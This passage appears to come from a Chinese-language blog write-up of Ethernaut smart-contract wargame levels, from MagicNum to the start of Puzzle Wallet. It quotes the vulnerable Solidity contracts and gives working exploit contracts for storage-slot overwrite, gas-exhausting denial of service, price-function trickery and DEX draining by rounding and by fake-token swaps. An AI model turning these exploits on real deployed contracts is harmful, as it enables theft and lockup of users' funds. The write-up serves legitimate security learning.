+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PUSH1</span> <span class="hljs-number">0</span>x0a  --&gt; <span class="hljs-number">0</span>x600a<br><span class="hljs-attribute">PUSH1</span> <span class="hljs-number">0</span>x??  --&gt; <span class="hljs-number">0</span>x60??<br><span class="hljs-attribute">PUSH1</span> <span class="hljs-number">0</span>x00  --&gt; <span class="hljs-number">0</span>x6000<br><span class="hljs-attribute">CODECOPY</span>  --&gt;  <span class="hljs-number">0</span>x39<br></code></pre></td></tr></table></figure>
+
+<p>然后将runtime opcode返回给EVM</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PUSH1</span> <span class="hljs-number">0</span>x0a  --&gt;  <span class="hljs-number">0</span>x600a(Size of opcode is <span class="hljs-number">10</span> bytes)<br><span class="hljs-attribute">PUSH1</span> <span class="hljs-number">0</span>x00  --&gt;  <span class="hljs-number">0</span>x6000(Value was stored in slot <span class="hljs-number">0</span>x00)<br><span class="hljs-attribute">RETURN</span>  --&gt;  <span class="hljs-number">0</span>xf3 (Return value at p=<span class="hljs-number">0</span>x00 slot and of size s=<span class="hljs-number">0</span>x0a)<br></code></pre></td></tr></table></figure>
+
+<p>初始化操作码的字节码将变为 <code>600a60__600039600a6000f3</code>，总共 12 个字节。这意味着运行时操作码 f 的起始位置的缺失值将为索引 12 即 0x0c，从而使我们的最终字节码为 <code>600a600c600039600a6000f3</code></p>
+<p>然后我们可以将其组合起来，得到 <code>600a600c600039600a6000f3602a60805260206080f3</code></p>
+<p>Exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Exploit &#123;<br>    constructor()&#123;<br>        address solverAddr;<br>        bytes memory code = hex&quot;600a600c600039600a6000f3602a60805260206080f3&quot;;<br>        assembly &#123;<br>            solverAddr := create(0, add(code, 0x20), mload(code))  // 前32位存长度<br>        &#125;<br>        MagicNum magicNum = MagicNum(0x4Bd5e65Bd59B1d80F32954fC2f572F5a7351D82D);<br>        magicNum.setSolver(solverAddr);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="Alien"><a href="#Alien" class="headerlink" title="Alien"></a>Alien</h2><blockquote>
+<p>You’ve uncovered an Alien contract. Claim ownership to complete the level.</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.5.0;<br><br>import &#x27;../helpers/Ownable-05.sol&#x27;;<br><br>contract AlienCodex is Ownable &#123;<br><br>  bool public contact;<br>  bytes32[] public codex;<br><br>  modifier contacted() &#123;<br>    assert(contact);<br>    _;<br>  &#125;<br>  <br>  function makeContact() public &#123;<br>    contact = true;<br>  &#125;<br><br>  function record(bytes32 _content) contacted public &#123;<br>    codex.push(_content);<br>  &#125;<br><br>  function retract() contacted public &#123;<br>    codex.length--;<br>  &#125;<br><br>  function revise(uint i, bytes32 _content) contacted public &#123;<br>    codex[i] = _content;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>继承了Ownable，结合题目描述，有一个address代表着owner，为20字节，和下面的 <code>bool public contact</code> 一起存在slot0的位置</p>
+<p>对于动态数组，有一个slot存放数组的长度，为slot i，剩下的 数组内容存放在<code>keccak256(i)+n</code>处</p>
+<p>因此对于该合约：</p>
+<table>
+<thead>
+<tr>
+<th>Slot Number</th>
+<th>Variables</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0</td>
+<td><code>bool contact</code>  和  <code>address owner</code></td>
+</tr>
+<tr>
+<td>1</td>
+<td>codex.length</td>
+</tr>
+<tr>
+<td>..</td>
+<td>..</td>
+</tr>
+<tr>
+<td>keccak256(1)</td>
+<td>codex[0]</td>
+</tr>
+<tr>
+<td>keccak256(1) + 1</td>
+<td>codex[1]</td>
+</tr>
+<tr>
+<td>…</td>
+<td>…</td>
+</tr>
+<tr>
+<td>2^256 - 1</td>
+<td>…</td>
+</tr>
+<tr>
+<td>0</td>
+<td><code>bool contact</code>  和  <code>address owner</code></td>
+</tr>
+</tbody></table>
+<p>我们想要覆盖owner，即覆盖slot 0</p>
+<p>先让数组长度溢出，使用的合约版本为solidity 0.5.0，没有溢出检查。调用一次<code>retract</code> 即可让数组的长度变为 2^256-1</p>
+<p>slot一共有2^256个</p>
+<p>我们想要覆盖slot 0，即让</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">keccak256</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span> + X = <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
+
+<p>X为数组下标，那么修改数组的第 0 - keccak256(1) 即可</p>
+<p>Exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Exploit &#123;<br>    AlienCodeX alienCodeX = AlienCodeX(0x51D4b2cFa2304f7a0db7998a17c19399D97B8750);<br>    function exploit() public&#123;<br>        alienCodeX.makeContact();<br>        // overflow<br>        alienCodeX.retract();<br>        // cover the slot 0<br>        uint index;<br>        unchecked &#123;<br>            index = 0 - uint256(keccak256(abi.encode(1)));<br>        &#125;<br>        alienCodeX.revise(index, bytes32(uint256(uint160(0xAE180bcc68A4A32203210DFe4fD40a11Ad5e5d27))));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://xux-1301156201.cos.ap-beijing.myqcloud.com/imgs/202312221325618.png" srcset="/img/loading.gif" lazyload alt="image-20231213182548175"></p>
+<h2 id="Denial"><a href="#Denial" class="headerlink" title="Denial"></a>Denial</h2><blockquote>
+<p>This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.</p>
+<p>If you can deny the owner from withdrawing funds when they call <code>withdraw()</code> (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br>contract Denial &#123;<br><br>    address public partner; // withdrawal partner - pay the gas, split the withdraw<br>    address public constant owner = address(0xA9E);<br>    uint timeLastWithdrawn;<br>    mapping(address =&gt; uint) withdrawPartnerBalances; // keep track of partners balances<br><br>    function setWithdrawPartner(address _partner) public &#123;<br>        partner = _partner;<br>    &#125;<br><br>    // withdraw 1% to recipient and 1% to owner<br>    function withdraw() public &#123;<br>        uint amountToSend = address(this).balance / 100;<br>        // perform a call without checking return<br>        // The recipient can revert, the owner will still get their share<br>        partner.call&#123;value:amountToSend&#125;(&quot;&quot;);<br>        payable(owner).transfer(amountToSend);<br>        // keep track of last withdrawal time<br>        timeLastWithdrawn = block.timestamp;<br>        withdrawPartnerBalances[partner] +=  amountToSend;<br>    &#125;<br><br>    // allow deposit of funds<br>    receive() external payable &#123;&#125;<br><br>    // convenience function<br>    function contractBalance() public view returns (uint) &#123;<br>        return address(this).balance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在Solidity中，使用 <code>call</code> 进行外部函数调用时，如果目标函数执行过程中遇到了 <code>revert</code> 操作，调用方并不会直接导致整个交易失败。相反，它将捕获 <code>false</code> 或 <code>0</code> 作为返回值，并且不会抛出异常</p>
+<p>因此不能直接用<code>revert();</code>抛出一个异常导致接下来的交易失败</p>
+<p>可以使用<code>while(true)&#123; &#125;</code> 无限循环</p>
+<p>Exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Exploit &#123;<br>    Denial denial = Denial(payable(0xAA62B0644C8bF203762be55CAa46a6b5aEaEf112));<br>    function exploit() public&#123;<br>        denial.setWithdrawPartner(address(this));<br>    &#125;<br>    receive() external payable &#123;<br>        while(true)&#123;<br>            <br>        &#125;<br>     &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h2><blockquote>
+<p>Сan you get the item from the shop for less than the price asked?</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>interface Buyer &#123;<br>  function price() external view returns (uint);<br>&#125;<br><br>contract Shop &#123;<br>  uint public price = 100;<br>  bool public isSold;<br><br>  function buy() public &#123;<br>    Buyer _buyer = Buyer(msg.sender);<br><br>    if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;<br>      isSold = true;<br>      price = _buyer.price();<br>    &#125;<br>  &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>只要第一次调price()的时候返回大于100的数，第二次调price()的时候返回1即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Exploit &#123;<br>    Shop shop = Shop(0x8Dcb2ddEFDAe97d9F5903c4bD4a7E9b7eEe298A8);<br>    function price() external view returns (uint) &#123;<br>        if(shop.isSold())&#123;<br>            return 1;<br>        &#125;else&#123;<br>            return 114514;<br>        &#125;<br>    &#125;<br>    function exploit() public &#123;<br>        shop.buy();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="Dex"><a href="#Dex" class="headerlink" title="Dex"></a>Dex</h2><blockquote>
+<p>The goal of this level is for you to hack the basic <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Decentralized_exchange">DEX</a> contract below and steal the funds by price manipulation.</p>
+<p>You will start with 10 tokens of <code>token1</code> and 10 of <code>token2</code>. The DEX contract starts with 100 of each token.</p>
+<p>You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to  report a “bad” price of the assets.</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;<br>import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;<br>import &#x27;openzeppelin-contracts-08/access/Ownable.sol&#x27;;<br><br>contract Dex is Ownable &#123;<br>  address public token1;<br>  address public token2;<br>  constructor() &#123;&#125;<br><br>  function setTokens(address _token1, address _token2) public onlyOwner &#123;<br>    token1 = _token1;<br>    token2 = _token2;<br>  &#125;<br>  <br>  function addLiquidity(address token_address, uint amount) public onlyOwner &#123;<br>    IERC20(token_address).transferFrom(msg.sender, address(this), amount);<br>  &#125;<br>  <br>  function swap(address from, address to, uint amount) public &#123;<br>    require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);<br>    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);<br>    uint swapAmount = getSwapPrice(from, to, amount);<br>    IERC20(from).transferFrom(msg.sender, address(this), amount);<br>    IERC20(to).approve(address(this), swapAmount);<br>    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);<br>  &#125;<br><br>  function getSwapPrice(address from, address to, uint amount) public view returns(uint)&#123;<br>    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));<br>  &#125;<br><br>  function approve(address spender, uint amount) public &#123;<br>    SwappableToken(token1).approve(msg.sender, spender, amount);<br>    SwappableToken(token2).approve(msg.sender, spender, amount);<br>  &#125;<br><br>  function balanceOf(address token, address account) public view returns (uint)&#123;<br>    return IERC20(token).balanceOf(account);<br>  &#125;<br>&#125;<br><br>contract SwappableToken is ERC20 &#123;<br>  address private _dex;<br>  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) &#123;<br>        _mint(msg.sender, initialSupply);<br>        _dex = dexInstance;<br>  &#125;<br><br>  function approve(address owner, address spender, uint256 amount) public &#123;<br>    require(owner != _dex, &quot;InvalidApprover&quot;);<br>    super._approve(owner, spender, amount);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>需要将Dex的任意一种token清空</p>
+<p>问题出在getSwapPrice中，转账的amount是</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl">(<span class="hljs-variable">amount</span> * <span class="hljs-function"><span class="hljs-title">IERC20</span>(<span class="hljs-variable">to</span>).balanceOf(<span class="hljs-title">address</span>(<span class="hljs-variable">this</span>)))/<span class="hljs-title">IERC20</span>(<span class="hljs-variable">from</span>).balanceOf(<span class="hljs-title">address</span>(<span class="hljs-variable">this</span>))</span><br></code></pre></td></tr></table></figure>
+
+<p>大概就是：token2收到的代币 &#x3D; (要交换的代币*转账接受地址的代币) &#x2F; 转账发送地址的代币</p>
+<p>这里返回的是uint，意味着代币金额将四舍五入为零。因此，通过在 token1 和 token2 之间进行连续的代币交换，我们可以将合约中一种代币的总余额减少到零</p>
+<p>初始用户代币各位10 Dex各为100</p>
+<table>
+<thead>
+<tr>
+<th>step</th>
+<th>pool&#x2F;player</th>
+<th>token1</th>
+<th>token2</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Initialize</td>
+<td>pool</td>
+<td>100</td>
+<td>100</td>
+</tr>
+<tr>
+<td></td>
+<td>player</td>
+<td>10</td>
+<td>10</td>
+</tr>
+<tr>
+<td>token1 -&gt; token2 : 10</td>
+<td>pool</td>
+<td>110</td>
+<td>90</td>
+</tr>
+<tr>
+<td>10*100 &#x2F; 100 &#x3D; 10</td>
+<td>player</td>
+<td>0</td>
+<td>20</td>
+</tr>
+<tr>
+<td>token2 -&gt; token1 : 20</td>
+<td>pool</td>
+<td>86</td>
+<td>110</td>
+</tr>
+<tr>
+<td>20 * 110 &#x2F; 90 &#x3D; 24</td>
+<td>player</td>
+<td>24</td>
+<td>0</td>
+</tr>
+<tr>
+<td>token1 -&gt; token2 : 24</td>
+<td>pool</td>
+<td>110</td>
+<td>80</td>
+</tr>
+<tr>
+<td>24 * 110 &#x2F; 86 &#x3D; 30</td>
+<td>player</td>
+<td>0</td>
+<td>30</td>
+</tr>
+<tr>
+<td>token2 -&gt; token1 : 30</td>
+<td>pool</td>
+<td>69</td>
+<td>110</td>
+</tr>
+<tr>
+<td>30 * 110 &#x2F; 80 &#x3D; 41</td>
+<td>player</td>
+<td>41</td>
+<td>0</td>
+</tr>
+<tr>
+<td>token1 -&gt; token2 : 41</td>
+<td>pool</td>
+<td>110</td>
+<td>45</td>
+</tr>
+<tr>
+<td>41 * 110 &#x2F; 69 &#x3D; 45</td>
+<td>player</td>
+<td>0</td>
+<td>65</td>
+</tr>
+<tr>
+<td>token2 -&gt; token1 : 45</td>
+<td>pool</td>
+<td>0</td>
+<td>90</td>
+</tr>
+<tr>
+<td>45 * 110 &#x2F; 45 &#x3D; 110</td>
+<td>player</td>
+<td>110</td>
+<td>20</td>
+</tr>
+</tbody></table>
+<p>首先先approve一下，设置自身向合约的两个代币进行transferFrom转账的额度</p>
+<p>然后进行六次swap即可</p>
+<p>player token1 余额</p>
+<p><img src="https://xux-1301156201.cos.ap-beijing.myqcloud.com/imgs/202312221325489.png" srcset="/img/loading.gif" lazyload alt="image-20231215140558030"></p>
+<p>player token2 余额</p>
+<p><img src="https://xux-1301156201.cos.ap-beijing.myqcloud.com/imgs/202312221325886.png" srcset="/img/loading.gif" lazyload alt="image-20231215140626798"></p>
+<p>pool token1余额</p>
+<p><img src="https://xux-1301156201.cos.ap-beijing.myqcloud.com/imgs/202312221325329.png" srcset="/img/loading.gif" lazyload alt="image-20231215140707036"></p>
+<p>pool token2余额</p>
+<p><img src="https://xux-1301156201.cos.ap-beijing.myqcloud.com/imgs/202312221325936.png" srcset="/img/loading.gif" lazyload alt="image-20231215140651050"></p>
+<h2 id="Dex-Two"><a href="#Dex-Two" class="headerlink" title="Dex Two"></a>Dex Two</h2><blockquote>
+<p>This level will ask you to break <code>DexTwo</code>, a subtlely modified <code>Dex</code> contract from the previous level, in a different way.</p>
+<p>You need to drain all balances of token1 and token2 from the <code>DexTwo</code> contract to succeed in this level.</p>
+<p>You will still start with 10 tokens of <code>token1</code> and 10 of <code>token2</code>. The DEX contract still starts with 100 of each token.</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;<br>import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;<br>import &#x27;openzeppelin-contracts-08/access/Ownable.sol&#x27;;<br><br>contract DexTwo is Ownable &#123;<br>  address public token1;<br>  address public token2;<br>  constructor() &#123;&#125;<br><br>  function setTokens(address _token1, address _token2) public onlyOwner &#123;<br>    token1 = _token1;<br>    token2 = _token2;<br>  &#125;<br><br>  function add_liquidity(address token_address, uint amount) public onlyOwner &#123;<br>    IERC20(token_address).transferFrom(msg.sender, address(this), amount);<br>  &#125;<br>  <br>  function swap(address from, address to, uint amount) public &#123;<br>    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);<br>    uint swapAmount = getSwapAmount(from, to, amount);<br>    IERC20(from).transferFrom(msg.sender, address(this), amount);<br>    IERC20(to).approve(address(this), swapAmount);<br>    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);<br>  &#125; <br><br>  function getSwapAmount(address from, address to, uint amount) public view returns(uint)&#123;<br>    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));<br>  &#125;<br><br>  function approve(address spender, uint amount) public &#123;<br>    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);<br>    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);<br>  &#125;<br><br>  function balanceOf(address token, address account) public view returns (uint)&#123;<br>    return IERC20(token).balanceOf(account);<br>  &#125;<br>&#125;<br><br>contract SwappableTokenTwo is ERC20 &#123;<br>  address private _dex;<br>  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) &#123;<br>        _mint(msg.sender, initialSupply);<br>        _dex = dexInstance;<br>  &#125;<br><br>  function approve(address owner, address spender, uint256 amount) public &#123;<br>    require(owner != _dex, &quot;InvalidApprover&quot;);<br>    super._approve(owner, spender, amount);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>主要是swap方法发生了变化，没有转入转出必须是token1或者token2的限制</p>
+<p>那我们就可以自己发行一款代币记为token3，然后进行swap</p>
+<table>
+<thead>
+<tr>
+<th>step</th>
+<th>pool&#x2F;player</th>
+<th>token1</th>
+<th>token2</th>
+<th>token3</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Initialize</td>
+<td>pool</td>
+<td>100</td>
+<td>100</td>
+<td>1</td>
+</tr>
+<tr>
+<td></td>
+<td>player</td>
+<td>10</td>
+<td>10</td>
+<td>3</td>
+</tr>
+<tr>
+<td>token3 -&gt; token1 : 1</td>
+<td>pool</td>
+<td>0</td>
+<td>100</td>
+<td>2</td>
+</tr>
+<tr>
+<td>(1 * 100) &#x2F; 1 &#x3D; 100</td>
+<td>player</td>
+<td>110</td>
+<td>10</td>
+<td>2</td>
+</tr>
+<tr>
+<td>token3 - &gt; token2 : 2</td>
+<td>pool</td>
+<td>0</td>
+<td>0</td>
+<td>4</td>
+</tr>
+<tr>
+<td>(2 * 100) &#x2F; 2 &#x3D; 100</td>
+<td>player</td>
+<td>110</td>
+<td>100</td>
+<td>0</td>
+</tr>
+</tbody></table>
+<p>Exp:</p>
+<p>先把token1和token2的钱都从player转到Exploit合约，然后调一次exploit方法</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs csharp">contract ExploitToken <span class="hljs-keyword">is</span> ERC20 &#123;<br>    constructor() ERC20(<span class="hljs-string">&quot;Token3&quot;</span>, <span class="hljs-string">&quot;TK3&quot;</span>)  &#123;<br>        _mint(msg.sender, <span class="hljs-number">4</span>);<br>    &#125;<br>&#125;<br><br>contract Exploit &#123;<br>    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">Log</span>(<span class="hljs-params"><span class="hljs-built_in">string</span>, <span class="hljs-built_in">uint</span></span>)</span>;<br>    IDex <span class="hljs-keyword">public</span> dex;<br>    IERC20 <span class="hljs-keyword">public</span> token1;<br>    IERC20 <span class="hljs-keyword">public</span> token2;<br>    IERC20 <span class="hljs-keyword">public</span> token3;<br>    constructor()&#123;<br>        dex = IDex(<span class="hljs-number">0x2B7252525E22323d7338e4450b6B39dFEc0B1eC5</span>);<br>        token1 = IERC20(dex.token1());<br>        token2 = IERC20(dex.token2());<br>        token3 = <span class="hljs-keyword">new</span> ExploitToken();<br>    &#125;<br>    <span class="hljs-function">function <span class="hljs-title">exploit</span>() <span class="hljs-keyword">public</span></span>  &#123;<br>        token3.approve(address(<span class="hljs-keyword">this</span>), <span class="hljs-number">1</span>);<br>        token3.transferFrom(address(<span class="hljs-keyword">this</span>), address(dex), <span class="hljs-number">1</span>);<br>        token3.approve(address(dex), <span class="hljs-number">3</span>);<br>        dex.swap(address(token3), address(token1), <span class="hljs-number">1</span>);<br>        dex.swap(address(token3), address(token2), <span class="hljs-number">2</span>);<br>        <span class="hljs-function">emit <span class="hljs-title">Log</span>(<span class="hljs-params"><span class="hljs-string">&quot;token1&quot;</span>, token1.balanceOf(address(<span class="hljs-keyword">this</span></span>)))</span>;<br>        <span class="hljs-function">emit <span class="hljs-title">Log</span>(<span class="hljs-params"><span class="hljs-string">&quot;token2&quot;</span>, token1.balanceOf(address(<span class="hljs-keyword">this</span></span>)))</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://xux-1301156201.cos.ap-beijing.myqcloud.com/imgs/202312221325272.png" srcset="/img/loading.gif" lazyload alt="image-20231222113637356"></p>
+<h2 id="Puzzle-Wallet"><a href="#Puzzle-Wallet" class="headerlink" title="Puzzle Wallet"></a>Puzzle Wallet</h2><blockquote>
+<p>Nowadays, paying for DeFi operations is impossible, fact.</p>
+<p>A group of friends discovered how to slightly decrease the cost of  performing multiple transactions by batching them in one transaction, so they developed a smart contract for doing this.</p>
+<p>They needed this contract to be upgradeable in case the code  contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with  special roles in the system: The admin, which has the power of updating the logic of the smart  contract. The owner, which controls the whitelist of addresses allowed to use the  contract. The contracts were deployed, and the group was whitelisted. Everyone  cheered for their accomplishments against evil miners.</p>
+<p>Little did they know, their lunch money was at risk…</p>
+<p>You’ll need to hijack this wallet to become the admin of the proxy.</p>
+</blockquote>
